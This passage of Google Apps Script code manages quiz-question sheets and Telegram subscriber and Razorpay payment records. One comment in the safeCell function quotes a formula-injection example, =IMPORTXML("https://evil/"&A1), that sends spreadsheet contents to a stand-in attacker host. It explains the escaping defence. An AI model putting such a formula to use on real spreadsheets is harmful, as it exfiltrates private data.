  // the Question IDs. Two uploads running together both read the same last
  // S.No and mint the SAME ids — and every lookup (edit, delete, bulk status)
  // resolves a Question ID to the first row that matches, so a collision means
  // one question silently stands in for another. Serialised for that reason.
  return withScriptLock(function () {
  var ss = book();
  var sheet = ss.getSheetByName(subject);
  if (!sheet) {
    sheet = ss.insertSheet(subject);
    formatSheetHeaders(sheet);
  } else {
    ensureSheetHeaders(sheet);
  }

  var map = headerMap(sheet);
  var lastRow = sheet.getLastRow();

  // Collect existing hashes once so duplicate checking is O(1) per new row.
  var existingHashes = {};
  var existingIds = {};
  if (lastRow > 1) {
    var hashColNum = colNum(map, 'Dup Hash');
    var hashCol = sheet.getRange(2, hashColNum, lastRow - 1, 1).getValues();
    // Rows written while non-Latin scripts hashed to nothing all carry the same
    // useless fingerprint. Recompute theirs from the question itself, so a
    // Telugu question already in the sheet is recognised when it is uploaded
    // again instead of being added a second time.
    var broken = degenerateHash();
    var questionCol = null;
    for (var h = 0; h < hashCol.length; h++) {
      var val = String(hashCol[h][0] || '').trim();
      if (val === broken) {
        if (!questionCol) questionCol = sheet.getRange(2, colNum(map, 'Question'), lastRow - 1, 1).getValues();
        var storedText = String(questionCol[h][0] || '').trim();
        if (storedText) {
          val = hashQuestion(storedText);
          sheet.getRange(h + 2, hashColNum).setValue(val);
        }
      }
      if (val) existingHashes[val] = true;
    }
    var idCol = sheet.getRange(2, colNum(map, 'Question ID'), lastRow - 1, 1).getValues();
    for (var d = 0; d < idCol.length; d++) {
      var idVal = String(idCol[d][0] || '').trim();
      if (idVal) existingIds[idVal] = true;
    }
  }

  var startSNo = 1;
  if (lastRow > 1) {
    var lastSNoVal = sheet.getRange(lastRow, colNum(map, 'S.No')).getValue();
    startSNo = (Number(lastSNoVal) || (lastRow - 1)) + 1;
  }

  var addedAt = istNow();
  var uploader = String(addedBy || 'Dashboard User').trim();
  var code = subjectCode(subject);
  var stamp = Utilities.formatDate(new Date(), 'Asia/Kolkata', 'yyyyMMdd');

  var rows = [];
  var ids = [];
  var skippedQuestions = [];
  var seenInBatch = {};

  for (var i = 0; i < questions.length; i++) {
    var q = questions[i] || {};
    var text = String(q.question || q.question_text || '').trim();
    if (!text) continue;

    var hash = hashQuestion(text);
    if (skipDuplicates && (seenInBatch[hash] || isKnownQuestion(text, existingHashes))) {
      skippedQuestions.push({ question: text.substring(0, 90), reason: 'duplicate' });
      continue;
    }
    seenInBatch[hash] = true;

    var sNo = startSNo + rows.length;
    var questionId = code + '-' + stamp + '-' + padNumber(sNo, 4);
    // A gap or a hand-edited S.No can land on an id that already exists, and a
    // repeated Question ID makes every later edit or delete act on the wrong
    // row. Step past anything taken rather than issuing it twice.
    while (existingIds[questionId]) {
      sNo++;
      questionId = code + '-' + stamp + '-' + padNumber(sNo, 4);
    }
    existingIds[questionId] = true;
    ids.push(questionId);

    var row = new Array(COL_COUNT).fill('');
    row[writeIndex(map, 'S.No')] = sNo;
    row[writeIndex(map, 'Question ID')] = questionId;
    row[writeIndex(map, 'Date')] = String(q.date || '').trim();
    row[writeIndex(map, 'Newspaper')] = String(q.newspaper || '').trim();
    row[writeIndex(map, 'Subject')] = subject;
    row[writeIndex(map, 'Topic')] = String(q.topic || '').trim();
    row[writeIndex(map, 'Question')] = text;
    row[writeIndex(map, 'Option A')] = String(q.option_a || '').trim();
    row[writeIndex(map, 'Option B')] = String(q.option_b || '').trim();
    row[writeIndex(map, 'Option C')] = String(q.option_c || '').trim();
    row[writeIndex(map, 'Option D')] = String(q.option_d || '').trim();
    row[writeIndex(map, 'Correct Answer')] = String(q.correct_answer || 'A').trim().toUpperCase();
    row[writeIndex(map, 'Explanation')] = String(q.explanation || '').trim();
    row[writeIndex(map, 'Difficulty')] = normaliseChoice(q.difficulty, DIFFICULTY_VALUES, 'Medium');
    row[writeIndex(map, 'Tags')] = String(q.tags || '').trim();
    row[writeIndex(map, 'Source URL')] = String(q.source_url || q.sourceUrl || '').trim();
    // What this line does: Falls back to 'Approved' instead of 'Draft' when inserting new questions into Google Sheets
    // What it brings: Ensures that newly added questions are automatically ready for scheduling and posting
    // Where changes can be seen: In Column J ('Status') of the Google Sheet for the subject tab
    row[writeIndex(map, 'Status')] = normaliseChoice(q.status, STATUS_VALUES, 'Approved');
    row[writeIndex(map, 'Posted')] = 'NO';
    row[writeIndex(map, 'Posted At')] = '';
    row[writeIndex(map, 'Scheduled For')] = String(q.scheduled_for || '').trim();
    row[writeIndex(map, 'Thread ID')] = '';
    row[writeIndex(map, 'Telegram Msg ID')] = '';
    row[writeIndex(map, 'Poll ID')] = '';
    row[writeIndex(map, 'Times Posted')] = 0;
    row[writeIndex(map, 'Added At')] = addedAt;
    row[writeIndex(map, 'Added By')] = uploader;
    row[writeIndex(map, 'Updated At')] = addedAt;
    row[writeIndex(map, 'Updated By')] = uploader;
    row[writeIndex(map, 'Dup Hash')] = hash;
    row[writeIndex(map, 'Review Notes')] = String(q.review_notes || '').trim();

    rows.push(row);
  }

  // One setValues call instead of N appendRow calls — far fewer API round trips
  // and no partial writes if the script times out mid-batch.
  if (rows.length) {
    sheet.getRange(sheet.getLastRow() + 1, 1, rows.length, COL_COUNT).setValues(rows);
    applyPostedDataValidation(sheet);
  }

  return { added: rows.length, skipped: skippedQuestions.length, skippedQuestions: skippedQuestions, ids: ids };
  });
}

/** Finds the sheet row number holding a given Question ID, or -1. */
function findRowByQuestionId(sheet, map, questionId) {
  var lastRow = sheet.getLastRow();
  if (lastRow <= 1) return -1;
  var target = String(questionId || '').trim();
  if (!target) return -1;

  var ids = sheet.getRange(2, colNum(map, 'Question ID'), lastRow - 1, 1).getValues();
  for (var i = 0; i < ids.length; i++) {
    if (String(ids[i][0] || '').trim() === target) return i + 2;
  }
  return -1;
}

/**
 * locateRow — resolves which sheet row an edit or delete refers to.
 *
 * Question ID is the primary key, but a row can legitimately have none: rows
 * written before the 30-column migration, or pasted in by hand, have that cell
 * empty. Addressing by ID alone meant every edit and delete on such a row
 * silently failed to find anything — the dashboard said it deleted a question
 * and the sheet kept it.
 *
 * So: try the ID, then fall back to the row number the dashboard read the row
 * from. The fallback is only trusted when the question text still matches, so
 * a row that shifted (because something else was inserted or deleted in the
 * meantime) can never cause the WRONG question to be edited or destroyed.
 *
 * @param {Sheet} sheet Target sheet
 * @param {Object} map Header map for that sheet
 * @param {string} questionId Question ID, may be empty
 * @param {number} [rowNumber] 1-based sheet row the client believes it is on
 * @param {string} [verifyText] Question text the client believes is there
 * @returns {number} The row number, or -1 when it cannot be resolved safely
 */
function locateRow(sheet, map, questionId, rowNumber, verifyText) {
  var byId = findRowByQuestionId(sheet, map, questionId);
  if (byId !== -1) return byId;

  var row = parseInt(rowNumber, 10);
  if (isNaN(row) || row < 2 || row > sheet.getLastRow()) return -1;

  // Without a text fingerprint we refuse to act on a bare row number.
  if (!verifyText) return -1;

  var actual = String(sheet.getRange(row, colNum(map, 'Question')).getValue() || '');
  return hashQuestion(actual) === hashQuestion(verifyText) ? row : -1;
}

/** Fields the dashboard is allowed to edit — an allowlist, so a crafted payload
 *  can never overwrite Posted, timestamps, or the audit columns (mass assignment). */
var EDITABLE_FIELDS = {
  date: 'Date', newspaper: 'Newspaper', topic: 'Topic', question: 'Question',
  option_a: 'Option A', option_b: 'Option B', option_c: 'Option C', option_d: 'Option D',
  correct_answer: 'Correct Answer', explanation: 'Explanation', difficulty: 'Difficulty',
  tags: 'Tags', source_url: 'Source URL', status: 'Status', review_notes: 'Review Notes',
  scheduled_for: 'Scheduled For'
};

/** Applies an allowlisted field patch to one question row. */
function updateQuestionRow(subject, questionId, fields, updatedBy, rowHint, verifyText) {
  // Same reason as bulkSetStatus: these two are written with the Posted column
  // and the message id, and setting one alone desynchronises the row.
  if (fields && fields.status &&
      MACHINE_OWNED_STATUSES.indexOf(normaliseChoice(fields.status, STATUS_VALUES, 'Draft')) !== -1) {
    throw new Error(
      '"' + fields.status + '" is set by the poster, not by hand. Use the Automation page ' +
      'to post, or "Check the channel for deleted polls" to undo one.'
    );
  }
  var sheet = book().getSheetByName(subject);
  if (!sheet) throw new Error('Sheet tab "' + subject + '" not found.');

  var map = headerMap(sheet);
  var rowNumber = locateRow(sheet, map, questionId, rowHint, verifyText);
  if (rowNumber === -1) return false;

  // A row that had no Question ID gets one now, so later edits address it
  // directly instead of relying on the row-number fallback again.
  if (!String(sheet.getRange(rowNumber, colNum(map, 'Question ID')).getValue() || '').trim()) {
    sheet.getRange(rowNumber, colNum(map, 'Question ID'))
      .setValue(subjectCode(subject) + '-' + Utilities.formatDate(new Date(), 'Asia/Kolkata', 'yyyyMMdd') +
                '-' + padNumber(rowNumber - 1, 4));
  }

  Object.keys(fields).forEach(function (key) {
    var header = EDITABLE_FIELDS[key];
    if (!header) return; // Silently ignore anything not on the allowlist.
    var value = fields[key];

    if (key === 'status') value = normaliseChoice(value, STATUS_VALUES, 'Draft');
    if (key === 'difficulty') value = normaliseChoice(value, DIFFICULTY_VALUES, 'Medium');
    if (key === 'correct_answer') {
      value = String(value || 'A').trim().toUpperCase();
      if (['A', 'B', 'C', 'D'].indexOf(value) === -1) value = 'A';
    }
    sheet.getRange(rowNumber, colNum(map, header)).setValue(String(value === null || value === undefined ? '' : value));
  });

  // Editing the question text invalidates the duplicate fingerprint.
  if (fields.question) {
    sheet.getRange(rowNumber, colNum(map, 'Dup Hash')).setValue(hashQuestion(String(fields.question)));
  }

  sheet.getRange(rowNumber, colNum(map, 'Updated At')).setValue(istNow());
  sheet.getRange(rowNumber, colNum(map, 'Updated By')).setValue(String(updatedBy || 'Dashboard User'));
  return true;
}

/** Deletes one question row by Question ID. */
function deleteQuestionRow(subject, questionId, rowHint, verifyText) {
  var sheet = book().getSheetByName(subject);
  if (!sheet) throw new Error('Sheet tab "' + subject + '" not found.');
  var map = headerMap(sheet);
  var rowNumber = locateRow(sheet, map, questionId, rowHint, verifyText);
  if (rowNumber === -1) return false;
  sheet.deleteRow(rowNumber);
  return true;
}

/**
 * bulkDeleteQuestionRows — removes many rows in one call.
 *
 * Deleting a row shifts every row below it up by one, so resolving a row number
 * and then deleting in the order the ids arrived would destroy the wrong rows
 * from the second deletion onwards. Every row is resolved FIRST, then deleted
 * from the bottom of the sheet upwards, so no pending target ever moves.
 *
 * @param {string} subject Sheet tab
 * @param {Array<string>} questionIds Question IDs to remove
 * @returns {Object} { deletedCount, deleted, notFound }
 */
function bulkDeleteQuestionRows(subject, questionIds) {
  var sheet = book().getSheetByName(subject);
  if (!sheet) throw new Error('Sheet tab "' + subject + '" not found.');

  var map = headerMap(sheet);
  var rows = [];
  var deleted = [];
  var notFound = [];
  var seen = {};

  for (var i = 0; i < questionIds.length; i++) {
    var id = String(questionIds[i] || '').trim();
    if (!id || seen[id]) continue;
    seen[id] = true;

    var rowNumber = findRowByQuestionId(sheet, map, id);
    if (rowNumber === -1) { notFound.push(id); continue; }
    rows.push({ row: rowNumber, id: id });
  }

  // Highest row first. Deleting row 9 cannot move row 4; deleting row 4 first
  // would make every later row number point one row too low.
  rows.sort(function (a, b) { return b.row - a.row; });

  for (var j = 0; j < rows.length; j++) {
    sheet.deleteRow(rows[j].row);
    deleted.push(rows[j].id);
  }

  return { deletedCount: deleted.length, deleted: deleted, notFound: notFound };
}

/** Sets Status on many rows at once (approve / reject / archive in bulk). */
function bulkSetStatus(subject, questionIds, status, updatedBy) {
  var sheet = book().getSheetByName(subject);
  if (!sheet) throw new Error('Sheet tab "' + subject + '" not found.');

  var map = headerMap(sheet);
  var clean = normaliseChoice(status, STATUS_VALUES, 'Draft');

  // Posted and Sending belong to the posting machinery, which writes them
  // alongside the Posted column, the message id and the poll id. Setting one by
  // hand leaves Status saying "Posted" while the Posted column still says NO —
  // so the question stays eligible and goes out again, with the dashboard
  // insisting it was already sent.
  if (MACHINE_OWNED_STATUSES.indexOf(clean) !== -1) {
    throw new Error(
      '"' + clean + '" is set by the poster, not by hand. Use the Automation page ' +
      'to post, or "Check the channel for deleted polls" to undo one.'
    );
  }

  return writeQueueChange(sheet, map, questionIds, clean, null, updatedBy, false);
}

/**
 * writeQueueChange — the one body behind bulkStatus, queueing and unqueueing.
 *
 * It answers with the ids it could not find and the rows it deliberately left
 * alone, not just a count. A bare 0 is the least useful answer this script can
 * give: the dashboard printed a line per id as though the change had worked,
 * then "0 question(s) queued" underneath, and nothing said which of the two
 * possible causes — an id that is not in this tab, or a row the poster is
 * holding — was the real one.
 *
 * @param {Sheet} sheet Subject tab
 * @param {Object} map Header map for that tab
 * @param {string[]} questionIds Ids to change
 * @param {string} status Status to write
 * @param {string|null} scheduledFor Text for Scheduled For, or null to leave it
 * @param {string} updatedBy Attribution
 * @param {boolean} skipPosted Whether an already-posted row is off limits
 * @returns {{updatedCount: number, notFound: string[], skipped: Array}}
 */
function writeQueueChange(sheet, map, questionIds, status, scheduledFor, updatedBy, skipPosted) {
  var now = istNow();
  var by = String(updatedBy || 'Dashboard User');
  var notFound = [];
  var skipped = [];
  var seen = {};
  var count = 0;

  for (var i = 0; i < questionIds.length; i++) {
    var id = String(questionIds[i] || '').trim();
    if (!id) continue;

    var rowNumber = findRowByQuestionId(sheet, map, id);
    if (rowNumber === -1) { notFound.push(id); continue; }
    if (seen[rowNumber]) continue;
    seen[rowNumber] = true;

    // A claimed row is mid-flight: a posting run is holding it and will write
    // the Posted column itself, so changing Status underneath races a public
    // channel. A posted row only blocks queueing — marking it Scheduled would
    // set it up to go out twice — while archiving one is ordinary curation.
    var posted = sheet.getRange(rowNumber, colNum(map, 'Posted')).getValue();
    var reason = null;
    if (isHeldValue(posted)) reason = 'held for checking';
    else if (isClaimedValue(posted)) reason = 'being sent right now';
    else if (skipPosted && isPostedValue(posted)) reason = 'already posted';
    if (reason) { skipped.push({ questionId: id, row: rowNumber, reason: reason }); continue; }

    if (scheduledFor !== null) {
      sheet.getRange(rowNumber, colNum(map, 'Scheduled For')).setValue(String(scheduledFor));
    }
    sheet.getRange(rowNumber, colNum(map, 'Status')).setValue(status);
    sheet.getRange(rowNumber, colNum(map, 'Updated At')).setValue(now);
    sheet.getRange(rowNumber, colNum(map, 'Updated By')).setValue(by);
    count++;
  }

  return { updatedCount: count, notFound: notFound, skipped: skipped };
}

/** Stamps Scheduled For and flips Status to Scheduled for the given questions. */
function scheduleQuestionRows(subject, questionIds, scheduledFor, updatedBy) {
  var sheet = book().getSheetByName(subject);
  if (!sheet) throw new Error('Sheet tab "' + subject + '" not found.');

  return writeQueueChange(
    sheet, headerMap(sheet), questionIds, 'Scheduled',
    String(scheduledFor || ''), updatedBy, true
  );
}

/**
 * unscheduleQuestionRows — takes questions back out of the queue.
 *
 * Clearing Scheduled For is the point: leaving yesterday's target time on a
 * row that is no longer queued is how a sheet starts lying about its own plan.
 */
function unscheduleQuestionRows(subject, questionIds, status, updatedBy) {
  var sheet = book().getSheetByName(subject);
  if (!sheet) throw new Error('Sheet tab "' + subject + '" not found.');

  var clean = normaliseChoice(status || 'Approved', STATUS_VALUES, 'Approved');
  if (MACHINE_OWNED_STATUSES.indexOf(clean) !== -1) {
    throw new Error('"' + clean + '" is set by the poster, not by hand.');
  }
  return writeQueueChange(sheet, headerMap(sheet), questionIds, clean, '', updatedBy, true);
}

/** Writes topic thread ids back into the Config tab after `node setup.js`. */
function updateConfigInSheet(configData) {
  var sheet = book().getSheetByName('Config');
  if (!sheet) throw new Error('Config sheet not found. Run setupSpreadsheet() first.');

  var lastRow = sheet.getLastRow();
  if (lastRow <= 1) return;

  var subjects = sheet.getRange(2, 1, lastRow - 1, 1).getValues();

  for (var r = 0; r < subjects.length; r++) {
    var subjectName = String(subjects[r][0] || '').trim().toLowerCase();
    var matched = configData.filter(function (c) {
      return String(c.subject || '').trim().toLowerCase() === subjectName;
    })[0];
    if (matched && matched.topic_thread_id) {
      sheet.getRange(r + 2, 3).setValue(matched.topic_thread_id);
    }
  }
}

// ============================================================================
// Subscribers & payments
// ============================================================================

/**
 * safeCell — text a student or payer controls, made safe to write to a cell.
 *
 * Sheets treats a written string that starts with = + - or @ as a formula. A
 * Telegram name or a support message such as =IMPORTXML("https://evil/"&A1)
 * would then run inside this spreadsheet and could send its contents anywhere.
 * A leading apostrophe stores it as text; Sheets hides the apostrophe and
 * getValues() returns the original string.
 *
 * @param {*} value
 * @returns {*} The value, with strings made inert
 */
function safeCell(value) {
  if (typeof value !== 'string') return value;
  return /^[=+\-@]/.test(value) ? "'" + value : value;
}

/**
 * subscriberSheet — returns the Subscribers tab, creating it if absent.
 *
 * @returns {Sheet}
 */
function subscriberSheet() {
  var ss = book();
  var sheet = ss.getSheetByName(SUBSCRIBER_SHEET);
  if (!sheet) {
    sheet = ss.insertSheet(SUBSCRIBER_SHEET);
    formatSimpleSheet(sheet, SUBSCRIBER_HEADERS,
      [120, 140, 170, 130, 190, 100, 170, 170, 90, 180, 190, 190, 95, 90, 130, 260, 170, 170, 220]);
    applySubscriberFormatting(sheet);
  }
  return sheet;
}

/** Returns the Payments log tab, creating it if absent. */
function paymentSheet() {
  var ss = book();
  var sheet = ss.getSheetByName(PAYMENT_SHEET);
  if (!sheet) {
    sheet = ss.insertSheet(PAYMENT_SHEET);
    formatSimpleSheet(sheet, PAYMENT_HEADERS, [180, 120, 140, 140, 90, 190, 180, 100, 170]);
  }
  return sheet;
}

/**
 * formatSimpleSheet — writes and styles a header row for the flat tabs.
 *
 * @param {Sheet} sheet Target
 * @param {Array<string>} headers Header labels
 * @param {Array<number>} widths Column widths in pixels
 */
function formatSimpleSheet(sheet, headers, widths) {
  sheet.getRange(1, 1, 1, headers.length).setValues([headers])
    .setFontWeight('bold').setFontColor('#ffffff').setBackground('#1a237e')
    .setVerticalAlignment('middle').setWrap(true);
  sheet.setFrozenRows(1);
  sheet.setFrozenColumns(1);
  sheet.setRowHeight(1, 40);
  for (var i = 0; i < widths.length; i++) sheet.setColumnWidth(i + 1, widths[i]);
}

/** Colour codes the Status column so lapsed members stand out. */
function applySubscriberFormatting(sheet) {
  var rows = Math.max(sheet.getMaxRows() - 1, 1);
  var statusRange = sheet.getRange(2, 6, rows, 1); // Column F

  function rule(text, bg, fg) {
    return SpreadsheetApp.newConditionalFormatRule()
      .whenTextEqualTo(text).setBackground(bg).setFontColor(fg)
      .setRanges([statusRange]).build();
  }

  sheet.setConditionalFormatRules([
    rule('active',    '#c8e6c9', '#1b5e20'),
    rule('pending',   '#fff9c4', '#f57f17'),
    rule('expired',   '#ffcdd2', '#b71c1c'),
    rule('cancelled', '#ffe0b2', '#e65100'),
    rule('removed',   '#eceff1', '#455a64')
  ]);
}

/** Turns a subscriber row array into an object. */
function rowToSubscriber(row, rowNumber) {
  return {
    telegram_id: String(row[0] || '').trim(),
    username: String(row[1] || '').trim(),
    name: String(row[2] || '').trim(),
    plan: String(row[3] || '').trim(),
    plan_label: String(row[4] || '').trim(),
    status: String(row[5] || '').trim().toLowerCase(),
    start_date: String(row[6] || '').trim(),
    expiry_date: String(row[7] || '').trim(),
    amount: Number(row[8]) || 0,
    payment_id: String(row[9] || '').trim(),
    link_id: String(row[10] || '').trim(),
    subscription_id: String(row[11] || '').trim(),
    total_paid: Number(row[12]) || 0,
    renewals: Number(row[13]) || 0,
    reminder_sent: String(row[14] || '').trim(),
    invite_link: String(row[15] || '').trim(),
    joined_at: String(row[16] || '').trim(),
    last_payment_at: String(row[17] || '').trim(),
    notes: String(row[18] || '').trim(),
    row_number: rowNumber
  };
}

/**
 * findSubscriberRow — locates a member by Telegram id.
 *
 * @param {Sheet} sheet Subscribers tab
 * @param {string|number} telegramId
 * @returns {number} 1-based row number, or -1
 */
function findSubscriberRow(sheet, telegramId) {
  var lastRow = sheet.getLastRow();
  if (lastRow <= 1) return -1;

  var target = String(telegramId).trim();
  var ids = sheet.getRange(2, 1, lastRow - 1, 1).getValues();
  for (var i = 0; i < ids.length; i++) {
    if (String(ids[i][0] || '').trim() === target) return i + 2;
  }
  return -1;
}

/**
 * getSubscriber — one member by Telegram id.
 *
 * @param {string|number} telegramId
 * @returns {Object|null}
 */
function getSubscriber(telegramId) {
  var sheet = subscriberSheet();
  var rowNumber = findSubscriberRow(sheet, telegramId);
  if (rowNumber === -1) return null;

  var row = sheet.getRange(rowNumber, 1, 1, SUBSCRIBER_HEADERS.length).getValues()[0];
  return rowToSubscriber(row, rowNumber);
}

/**
 * upsertSubscriber — creates or updates a member row.
 *
 * A renewal must never reset the lifetime counters, so Total Paid and Renewals
 * accumulate and Joined At is only ever written once. `isPayment` distinguishes
 * a real payment from a status-only change such as the cron marking someone
 * expired, which must not inflate the revenue figures.
 *
 * @param {Object} data Fields to write
 * @returns {Object} The stored subscriber
 */
/**
 * withScriptLock — runs fn with no other execution of this script inside it.
 *
 * The idempotency check in upsertSubscriber reads the row and then writes it.
 * Two webhook deliveries arriving at the same moment both read "this payment
 * is new" before either writes, so both count it — which is how one Rs 1
 * payment became total_paid 2 and renewals 2, with two rows in the log a
 * second apart. A per-payment check cannot fix that on its own; the two
 * executions have to be serialised, and the script lock is the only thing here
 * that can do it.
 *
 * Failing to get the lock throws rather than proceeding: the caller returns a
 * non-2xx, and Razorpay retries a webhook it did not get a 200 for. A late
 * retry is recoverable, a double-counted payment is not.
 *
 * @param {Function} fn Work to run while holding the lock
 * @returns {*} Whatever fn returns
 */
function withScriptLock(fn) {
  var lock = LockService.getScriptLock();
  // 30s: comfortably longer than a sheet read plus write, short enough that a
  // stuck execution surfaces as an error rather than a hung request.
  if (!lock.tryLock(30000)) {
    throw new Error('The sheet is busy with another payment. Please retry.');
  }
  try {
    return fn();
  } finally {
    lock.releaseLock();
  }
}

function upsertSubscriber(data) {
  var telegramId = String(data.telegram_id || '').trim();
  if (!telegramId) throw new Error('upsertSubscriber requires telegram_id');

  // The read and the write must be one indivisible step — see withScriptLock.
  return withScriptLock(function () {
  var sheet = subscriberSheet();

  var rowNumber = findSubscriberRow(sheet, telegramId);
  var now = istNow();
  var existing = rowNumber === -1
    ? null
    : rowToSubscriber(sheet.getRange(rowNumber, 1, 1, SUBSCRIBER_HEADERS.length).getValues()[0], rowNumber);

  var isPayment = Boolean(data.is_payment);
  var amount = Number(data.amount) || 0;

  // Razorpay delivers a webhook more than once — a retry, or simply two
  // deliveries of the same event a second apart. The caller checks for a
  // repeat before writing, but that check reads the row and this writes it,
  // so two overlapping deliveries both read "not seen yet" and both counted.
  // One Rs 1 payment came out as total_paid 2 and renewals 2 that way.
  //
  // The sheet is the only place both deliveries meet, so the decision belongs
  // here: if this exact payment id is already on the row, the money has been
  // counted and the totals are left alone.
  var incomingPaymentId = String(data.payment_id || '').trim();
  // Boolean(): the chain short-circuits to null on a brand new subscriber, and
  // callers compare this against false.
  var alreadyCounted = Boolean(isPayment &&
    incomingPaymentId &&
    existing &&
    String(existing.payment_id || '').trim() === incomingPaymentId);
  if (alreadyCounted) isPayment = false;

  // Prefer the incoming value, then what is already stored, then a default.
  function pick(key, fallback) {
    if (data[key] !== undefined && data[key] !== null && String(data[key]) !== '') return data[key];
    if (existing && existing[key]) return existing[key];
    return fallback;
  }

  var row = [
    telegramId,
    safeCell(String(pick('username', ''))),
    safeCell(String(pick('name', ''))),
    pick('plan', ''),
    safeCell(String(pick('plan_label', ''))),
    String(data.status || (existing ? existing.status : 'pending')).toLowerCase(),
    pick('start_date', now),
    pick('expiry_date', ''),
    // alreadyCounted keeps the stored amount rather than re-applying it.
    isPayment ? amount : (existing ? existing.amount : 0),
    pick('payment_id', ''),
    pick('link_id', ''),
    pick('subscription_id', ''),
    (existing ? existing.total_paid : 0) + (isPayment ? amount : 0),
    (existing ? existing.renewals : 0) + (isPayment ? 1 : 0),
    // A new expiry means the old reminder no longer applies.
    data.reminder_sent !== undefined ? data.reminder_sent : (existing ? existing.reminder_sent : ''),
    pick('invite_link', ''),
    existing && existing.joined_at ? existing.joined_at : now,
    isPayment ? now : (existing ? existing.last_payment_at : ''),
    safeCell(String(pick('notes', '')))
  ];

  if (rowNumber === -1) {
    sheet.appendRow(row);
    rowNumber = sheet.getLastRow();
    applySubscriberFormatting(sheet);
  } else {
    sheet.getRange(rowNumber, 1, 1, row.length).setValues([row]);
  }

  // Read back rather than trusting `row`, which still carries safeCell's apostrophes.
  var saved = rowToSubscriber(sheet.getRange(rowNumber, 1, 1, SUBSCRIBER_HEADERS.length).getValues()[0], rowNumber);
  // So the caller can tell a real payment from a replayed one.
  saved.already_counted = alreadyCounted;
  return saved;
  });
}

/**
 * logPayment — appends to the immutable payment log.
 * Separate from the subscriber row so renewal history survives even though the
 * member row is overwritten in place.
 */
function logPayment(entry) {
  return withScriptLock(function () {
  var sheet = paymentSheet();

  // Same reason as upsertSubscriber: a repeated delivery must not append a
  // second row for one payment. The log is what the revenue figures are built
  // from, so a duplicate row overstates takings as well as confusing anyone
  // reading it. Only rows with a payment id are checked — a manual entry
  // without one is always appended.
  var paymentId = String(entry.payment_id || '').trim();
  if (paymentId) {
    var lastRow = sheet.getLastRow();
    if (lastRow > 1) {
      var idCol = PAYMENT_HEADERS.indexOf('Payment ID') + 1;
      var ids = sheet.getRange(2, idCol, lastRow - 1, 1).getValues();
      for (var i = 0; i < ids.length; i++) {
        if (String(ids[i][0] || '').trim() === paymentId) return false;
      }
    }
  }

  sheet.appendRow([
    istNow(),
    String(entry.telegram_id || ''),
    safeCell(String(entry.username || '')),
    String(entry.plan || ''),
    Number(entry.amount) || 0,
    String(entry.payment_id || ''),
    String(entry.event || ''),
    String(entry.status || ''),
    String(entry.expiry_date || '')
  ]);
  return true;
  });
}

/**
 * listSubscribers — filtered list for the Members dashboard.
 *
 * @param {Object} params status, plan, search, page, pageSize
 */
function listSubscribers(params) {
  var sheet = subscriberSheet();
  var lastRow = sheet.getLastRow();
  if (lastRow <= 1) return { total: 0, page: 1, totalPages: 1, subscribers: [] };

  var values = sheet.getRange(2, 1, lastRow - 1, SUBSCRIBER_HEADERS.length).getValues();
  var statusFilter = String(params.status || '').trim().toLowerCase();
  var planFilter = String(params.plan || '').trim();
  var search = String(params.search || '').trim().toLowerCase();
  var page = clampInt(params.page, 1, 1, 100000);
  var pageSize = clampInt(params.pageSize, 50, 1, 500);

  var matched = [];
  for (var i = 0; i < values.length; i++) {
    var sub = rowToSubscriber(values[i], i + 2);
    if (!sub.telegram_id) continue;
    if (statusFilter && sub.status !== statusFilter) continue;
    if (planFilter && sub.plan !== planFilter) continue;
    if (search) {
      var haystack = (sub.telegram_id + ' ' + sub.username + ' ' + sub.name + ' ' + sub.payment_id).toLowerCase();
      if (haystack.indexOf(search) === -1) continue;
    }
    matched.push(sub);
  }

  var start = (page - 1) * pageSize;
  return {
    total: matched.length,
    page: page,
    pageSize: pageSize,
    totalPages: Math.max(1, Math.ceil(matched.length / pageSize)),
    subscribers: matched.slice(start, start + pageSize)
  };
}

/**
 * getExpiringSubscribers — members whose access ends within `days`.
 * Used by the daily cron for both reminders and removals; `days: 0` returns
 * only those already past expiry.
 *
 * @param {number} days Look-ahead window
 * @returns {Array<Object>}
 */
function getExpiringSubscribers(days) {
  var sheet = subscriberSheet();
  var lastRow = sheet.getLastRow();
  if (lastRow <= 1) return [];

  var values = sheet.getRange(2, 1, lastRow - 1, SUBSCRIBER_HEADERS.length).getValues();
  var horizon = new Date().getTime() + (Number(days) || 0) * 24 * 60 * 60 * 1000;
  var results = [];

  for (var i = 0; i < values.length; i++) {
    var sub = rowToSubscriber(values[i], i + 2);
    if (!sub.telegram_id) continue;
    // Only members who currently hold access can lapse.
    if (sub.status !== 'active') continue;

    var expiry = parseIstDate(sub.expiry_date);
    if (!expiry) continue;
    if (expiry.getTime() <= horizon) {
      sub.expiry_ms = expiry.getTime();
      sub.days_left = Math.ceil((expiry.getTime() - Date.now()) / (24 * 60 * 60 * 1000));
      results.push(sub);
    }
  }
  return results;
}

/**
 * parseIstDate — parses the "dd-MM-yyyy, hh:mm:ss a IST" stamps this book uses.
 * Also accepts a bare dd-MM-yyyy.
 *
 * @param {string} value
 * @returns {Date|null}
 */
function parseIstDate(value) {
  var text = String(value || '').trim();
  if (!text || text === '-') return null;

  var match = text.match(/^(\d{2})-(\d{2})-(\d{4})(?:,\s*(\d{1,2}):(\d{2}):(\d{2})\s*(AM|PM))?/i);
  if (!match) return null;

  var hour = match[4] ? parseInt(match[4], 10) : 23;
  var minute = match[5] ? parseInt(match[5], 10) : 59;
  var second = match[6] ? parseInt(match[6], 10) : 59;

  if (match[7]) {
    var meridiem = match[7].toUpperCase();
    if (meridiem === 'PM' && hour < 12) hour += 12;
    if (meridiem === 'AM' && hour === 12) hour = 0;
  }

  // The stamp is an IST wall-clock reading — istNow() writes it with an
  // explicit 'Asia/Kolkata' — so it has to be read back as IST. Building it
  // from local parts uses the Apps Script project's timezone instead, which is
  // whatever the account was created in. Every expiry then lands hours off, and
  // getExpiringSubscribers is what decides who is removed from a paid group.
  // The same fault was fixed in src/membership.js; this copy was missed.
  return new Date(
    Date.UTC(
      parseInt(match[3], 10), parseInt(match[2], 10) - 1, parseInt(match[1], 10),
      hour, minute, second
    ) - IST_OFFSET_MS
  );
}

/**
 * buildRevenueStats — totals for the Members dashboard.
 *
 * @returns {Object}
 */
function buildRevenueStats() {
  var sheet = subscriberSheet();
  var lastRow = sheet.getLastRow();

  var stats = {
    totalMembers: 0, active: 0, pending: 0, expired: 0, cancelled: 0, removed: 0,
    totalRevenue: 0, byPlan: {}, expiringIn7Days: 0, generatedAt: istNow()
  };

  if (lastRow > 1) {
    var values = sheet.getRange(2, 1, lastRow - 1, SUBSCRIBER_HEADERS.length).getValues();
    var weekAhead = Date.now() + 7 * 24 * 60 * 60 * 1000;

    for (var i = 0; i < values.length; i++) {
      var sub = rowToSubscriber(values[i], i + 2);
